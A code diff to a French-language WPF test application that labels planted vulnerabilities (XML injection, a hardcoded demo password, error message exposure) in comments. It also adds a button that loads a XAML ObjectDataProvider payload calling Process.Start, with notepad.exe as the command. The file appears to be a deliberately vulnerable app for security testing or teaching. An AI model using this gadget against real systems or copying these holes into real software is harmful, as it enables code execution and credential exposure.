@@ -40,7 +40,7 @@ namespace TestWpfApplication
             {
                 // Tentative de parsing du XAML
                 var xamlDocument = new XmlDocument();
-                xamlDocument.LoadXml(xamlContent);
+                xamlDocument.LoadXml(xamlContent); // Vuln: xml injection
 
                 ShowMessage("✅ XAML valide !", "Validation réussie", MessageBoxImage.Information);
                 UpdateStatus("XAML validé avec succès", true);
@@ -217,7 +217,7 @@ namespace TestWpfApplication
                             break;
 
                         case PasswordBox passwordBox:
-                            passwordBox.Password = "Demo123!";
+                            passwordBox.Password = "Demo123!"; // Vuln: hardcoded secret
                             break;
 
                         case CheckBox checkBox:
@@ -423,6 +423,27 @@ namespace TestWpfApplication
 </StackPanel>";
         }
 
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            XamlTextBox.Text = @"<ObjectDataProvider xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
+                    xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
+                    xmlns:System=""clr-namespace:System;assembly=mscorlib""
+                    xmlns:Diagnostics=""clr-namespace:System.Diagnostics;assembly=System"">
+
+              <ObjectDataProvider.ObjectInstance>
+                <Diagnostics:Process />
+              </ObjectDataProvider.ObjectInstance>
+
+              <ObjectDataProvider.MethodName>Start</ObjectDataProvider.MethodName>
+  
+              <ObjectDataProvider.MethodParameters>
+                <System:String>notepad.exe</System:String>
+              </ObjectDataProvider.MethodParameters>
+
+            </ObjectDataProvider>
+            ";
+        }
+       
         private void ResetXaml_Click(object sender, RoutedEventArgs e)
         {
             var result = MessageBox.Show("Êtes-vous sûr de vouloir réinitialiser le XAML ?",
@@ -487,7 +508,7 @@ namespace TestWpfApplication
 
         private void ShowMessage(string message, string title, MessageBoxImage icon)
         {
-            MessageBox.Show(message, title, MessageBoxButton.OK, icon);
+            MessageBox.Show(message, title, MessageBoxButton.OK, icon); // Vuln: error message exposure risk
         }
 
         private void UpdateStatus(string message, bool isSuccess)
@@ -496,5 +517,7 @@ namespace TestWpfApplication
         }
 
         #endregion
+
+      
     }
 }
